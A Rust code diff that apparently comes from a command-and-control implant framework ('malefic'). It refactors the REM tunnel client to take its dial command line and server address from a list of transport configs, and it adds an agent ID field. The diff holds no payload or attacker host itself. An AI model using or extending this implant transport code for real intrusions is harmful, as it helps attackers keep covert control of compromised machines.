@@ -10,6 +10,7 @@ use std::io;
 use std::pin::Pin;
 use std::task::{Context, Poll};
 use malefic_proto::crypto::Cryptor;
+use crate::config::{ServerConfig, TransportConfig, SERVER_CONFIGS};
 
 pub struct REMTransport {
     handle: i32,
@@ -159,16 +160,29 @@ impl AsyncWrite for REMTransport {
 #[derive(Clone)]
 pub struct REMClient {
     pub stream: Stream,
+    pub agent_id: String, //
 }
 
 impl REMClient {
 
     pub fn new(cryptor: Cryptor) -> Result<Self> {
-        use crate::config::REM;
+        // use crate::config::REM;
+        // let mut cmdline = REM.to_string();
+        // 暂时，获取第一个 REM 配置
+        let first_rem_config = SERVER_CONFIGS.iter().find_map(|config| {
+            if let TransportConfig::Rem(rem_config) = &config.transport_config {
+                Some(rem_config)
+            } else {
+                None
+            }
+        }).ok_or_else(|| anyhow::anyhow!("No REM configuration found"))?;
 
-        let mut cmdline = REM.to_string();
-        #[cfg(debug_assertions)]
-        cmdline = cmdline + " --debug";
+        let mut cmdline = first_rem_config.link.clone();
+
+        if cfg!(debug_assertions) {
+            cmdline = cmdline + " --debug";
+        }
+
         debug!("[rem] REM cmdline: {}", cmdline);
 
         match rem::rem_dial(&cmdline) {
@@ -188,10 +202,15 @@ impl REMClient {
 
 #[async_trait]
 impl DialerExt for REMClient {
-    async fn connect(&mut self, addr: &str) -> Result<REMTransport> {
+    async fn connect(&mut self, config: &ServerConfig) -> Result<REMTransport> {
+        // let link = match &config.transport_config {
+        //     TransportConfig::Rem(rem_config) => rem_config.link.clone(),
+        //     _ => return Err(anyhow::anyhow!("Invalid transport config")),
+        // };
+        let address = config.address.clone();
         // Now dial the specific memory address using agent_id
-        debug!("[transport] Dialing memory address: {} ", addr);
-        match rem::memory_dial("memory", addr) {
+        debug!("[transport] Dialing memory address: {:?} ",address);
+        match rem::memory_dial("memory", &address) {
             Ok(handle) => {
                 debug!("[transport] Successfully dialed memory, handle: {}", handle);
                 Ok(REMTransport::new(handle))
